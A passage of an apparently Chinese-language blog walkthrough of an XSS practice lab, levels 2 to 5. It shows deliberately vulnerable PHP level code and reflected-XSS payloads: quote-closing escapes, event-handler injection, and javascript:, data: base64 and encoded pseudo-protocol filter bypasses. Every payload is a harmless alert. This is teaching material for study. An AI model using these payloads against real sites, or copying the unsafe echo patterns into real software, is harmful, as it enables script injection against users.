class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level3.php?writing=wait&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];  <span class="comment">//keyword的值就是value的值，即变量$_GET赋值给$str</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;  </span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//使用转义函数（经常出现）：htmlspecialchars($str)  将$str的值进行实例化转义   --&gt;之后例子会进一步解释  注意:这里只是对输出的$str进行实例化转义</span></span><br><span class="line"><span class="comment">//htmlspecialchars() 是 PHP 中用于将特殊字符转换为 HTML 实体的函数，其主要作用是防止 XSS（跨站脚本攻击）</span></span><br><span class="line"><span class="comment">//htmlspecialchars() 默认会转义5个字符,其他字符不会转义</span></span><br><span class="line"><span class="comment">//&quot; &#x27; &lt; &gt; &amp;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//注入语句</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;GGBOND&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //    逃逸</span><br><span class="line">&quot; onclick=&#x27;alert(&quot;GGBOND)  //</span><br><span class="line">&quot; onfocus=&#x27;alert(&quot;GGBOND&quot;)  //   </span><br><span class="line">以上需要自主点击输入框</span><br><span class="line">&quot; autofocus=&#x27;alert(&quot;GGBOND&quot;)&#x27; //  </span><br><span class="line">自动点击</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>类型：输入框类型</p>
<p>解题思路：<br>进行初步分析：<br>1.输入测试语句（闭合与不闭合）<br>2.查看网页源码-&gt;value的情况<br>3.选中value的值，右键选中修改html</p>
<p>查看是否被实例化转义（指value的值）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注入语句：   &quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_6.png" class="" title="在这里插入图片描述">
<p>查看：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_7.png" class="" title="在这里插入图片描述">

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_8.png" class="" title="在这里插入图片描述">
<p>由上图可知，输入的语句被实例化转义后才作为value的值</p>
<p>在level2输入同样的语句并进行查看value</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_9.png" class="" title="在这里插入图片描述">
<p>value的值没有被实例化转义，这就是level2 与 level3 最大的区别</p>
<p>细节：alert(实例化后的内容);  从这里就可以发现：输入字符串可以获得更多的回显信息</p>
<h3 id="默认Htmlspecialchars-函数"><a href="#默认Htmlspecialchars-函数" class="headerlink" title="*默认Htmlspecialchars()函数"></a>*默认Htmlspecialchars()函数</h3><p>没有转义单引号，可以使用单引号闭合</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">//需要手动点击执行</span><br><span class="line">&#x27; onclick=&#x27;alert(&quot;123&quot;)&#x27; //    不要用双引号包裹，因为双引号会被转义</span><br><span class="line">&#x27; onclick=alert(&quot;123&quot;) //      无引号包裹，仍然可以执行</span><br><span class="line">&#x27; onfocus=console.log(&quot;123&quot;) //   控制台输出</span><br><span class="line">//自动执行</span><br><span class="line">autofocus=alert(&quot;123&quot;) //</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>问题：为什么不用引号包裹js函数仍然可以执行呢？</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：&#x27; onclick=alert(&quot;123&quot;) //  </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_10.png" class="" title="在这里插入图片描述">
<p>浏览器会自动补全引号，即浏览器的容错功能发挥作用</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level3&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="comment">//使用实例化转义函数，默认不会转义单引号</span></span><br><span class="line"><span class="comment">//htmlspecialchars($str,ENT_QUOTES)  就会转义单引号</span></span><br><span class="line"><span class="comment">//使用实体转义函数，默认不会转义单引号</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;      </span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;                                     </span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;	   </span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>输入测试语句</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_11.png" class="" title="在这里插入图片描述">
<p>检查是否被实例化转义</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_12.png" class="" title="在这里插入图片描述">

<ul>
<li>&lt; &gt; &#x2F; 别替换为空  </li>
<li>alert括号中的双引号没有没替换或是实例化转义，即没有过滤双引号</li>
<li>输入的语句有橙色，蓝色部分（被浏览器当作标签）</li>
<li>alert括号内的第一个双引号与value的第一个双号闭合，之后的内容均被认定为标签</li>
</ul>
<p>尝试闭合</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_13.png" class="" title="在这里插入图片描述">
<p>闭合成功，但注入语句仍被该标签包含，不能发挥作用</p>
<h3 id="插入属性"><a href="#插入属性" class="headerlink" title="*插入属性"></a>*插入属性</h3><p>由于&lt;  &gt; &#x2F; 均被过滤，插入一个完整的标签比较困难，可以选择插入属性</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; //</span><br><span class="line">用&#x27;无法闭合value的双引号</span><br></pre></td></tr></table></figure>

<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level4&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);  <span class="comment">//错误展示，0表示不展示错误，即服务器关闭错误回显</span></span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);   <span class="comment">//str_resplace(&quot;被替换字符&quot;,&quot;替换字符&quot;,变量)</span></span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="comment">//没有使用 Htmlspecialchars函数对字符进行实例化转义</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str3</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>解题思路：</p>
<p>类型：输入框类型</p>
<p>输入测试语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_14.png" class="" title="在这里插入图片描述">

<ul>
<li>括号内的双引号没有被替换或实例化转义</li>
<li>括号内的双引号与value的双引号闭合</li>
<li>分为橙色，蓝色蓝部分</li>
<li>script标签背替换</li>
</ul>
<p>尝试闭合</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_15.png" class="" title="在这里插入图片描述">

<ul>
<li>闭合后标签逃逸input标签</li>
<li>script标签被改变</li>
</ul>
<p>既然标签被破坏，尝试注入属性</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_16.png" class="" title="在这里插入图片描述">
<p>onclick 属性也被替换</p>
<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="*伪协议"></a>*伪协议</h3><blockquote>
<p>在 Web 安全中，“伪协议”（Pseudo-protocol）特指浏览器支持的某些特殊 URL 协议格式，它们并非真正的网络传输协议（如 http:&#x2F;&#x2F; 或 https:&#x2F;&#x2F;），而是用于触发特定行为或执行代码。在 XSS（跨站脚本攻击） 场景中，伪协议常被用来绕过过滤规则，直接注入恶意脚本。</p>
</blockquote>
<blockquote>
<p>1.javascript:在 URL 中执行			XSS 攻击 -&gt; JavaScript 代码	javascript:alert(1)<br>2.data:嵌入 Base64 编码的内容（HTML&#x2F;脚本等过内容安全策略（CSP）-&gt;			 data:text&#x2F;html,[script]alert(1)[&#x2F;script]<br>3.vbscript:在旧版 IE 中执行 VBScript 代码 IE 特定漏洞  -&gt;   vbscript:MsgBox(“XSS”)<br>4.about:显示浏览器内部信息或空白页面	 -&gt;   about:blank</p>
</blockquote>
<ul>
<li>js协议:最常见的 XSS 利用方式，通过将伪协议注入到允许 URL 的属性中（如 <a> 标签的 href），触发脚本执行</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基本格式  javascript:JavaScript代码        //注意：若js代码有多行，用分号分割</span><br><span class="line">若要进行编码绕过时，要对&#x27; :JavaScript代码  &#x27; //注意：这一部分进行编码（包括冒号）-&gt; 浏览器会自动解码</span><br><span class="line">返回值为空，为避免因返回值影响页面行为 设置void(0)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0);alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>常用语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>点击触发<span class="tag">&lt;/<span class="name">a</span>&gt;</span>       				//注入 javascript: 触发点击执行</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:&#x27;alert(1)&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>                      //利用 javascript: 动态写入内容</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;jav<span class="symbol">&amp;#x61;</span>script:alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span>        				  //使用 URL 编码或 Unicode 绕过关键字过滤，解码即为javascript</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span>     	 //利用 onclick 事件覆盖 href 行为（需用户交互）</span><br></pre></td></tr></table></figure>
<ul>
<li>data协议：通过嵌入 Base64 编码的 HTML 或脚本，绕过某些过滤规则：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">基本格式 data:[<span class="tag">&lt;<span class="name">MIME类型</span>&gt;</span>][;charset=<span class="tag">&lt;<span class="name">字符集</span>&gt;</span>][;base64],<span class="tag">&lt;<span class="name">数据内容</span>&gt;</span></span><br><span class="line">1.MIME 类型：声明数据类型（如 text/html、text/javascript）。</span><br><span class="line">2.Base64 编码：可选参数，用于编码二进制或特殊字符内容。</span><br><span class="line">3.浏览器支持：现代浏览器广泛支持，但受 CSP（内容安全策略）限制。</span><br><span class="line"></span><br><span class="line">攻击形式：参考以下常用语句</span><br></pre></td></tr></table></figure>
<p>常用语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>  		//object 标签的 data 属性注入 Base64 编码的脚本</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span> 		  //iframe 的 src 属性，通过 data: 加载恶意 HTML</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>  						//省略 MIME 类型，某些浏览器允许省略 text/html 声明</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;data:text/javascript,alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 							  //结合 JavaScript 执行，直接通过 data: 执行 JS 代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>vbscript协议：仅适用于旧版 IE，执行 VBScript 代码</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;vbscript:MsgBox(&#x27;XSS&#x27;)&quot;</span>&gt;</span>触发<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>bout:通常用于加载空白页面，但可能结合其他漏洞利用</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;about:blank&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>正式解题：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">示例1：</span><br><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span> 1<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //</span><br><span class="line">解释：&quot;闭合value的双引号，紧跟的&gt;与&quot;共同实现字符逃逸，使用<span class="tag">&lt;<span class="name">a</span>&gt;</span>标签的属性href+js协议</span><br></pre></td></tr></table></figure>
<p>网页源码：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_17.png" class="" title="在这里插入图片描述">
<p>页面渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_18.png" class="" title="在这里插入图片描述">
<p>点击超链接‘1’，即可通关</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">示例2：</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> //</span><br><span class="line">动态创建标签页面，当标签页面被创建时自动执行js代码</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_19.png" class="" title="在这里插入图片描述">
<p>此时的页面渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_20.png" class="" title="在这里插入图片描述">

<h3 id="趣事"><a href="#趣事" class="headerlink" title="*趣事"></a>*趣事</h3><p>此时你不断刷新页面，页面会不断弹框（刷新一次弹框一次）</p>
<p>对于js协议的剩下编码示例与onclick覆盖就不再演示,以下为具体输入语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;jav<span class="symbol">&amp;#x61;</span>script:alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span>     //注意本题不可以使用onclik </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对于编码，有需要的可以下载插件：CaptfEncoder,编码的作用在于可以绕过一些明文的过滤</p>
<hr>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span 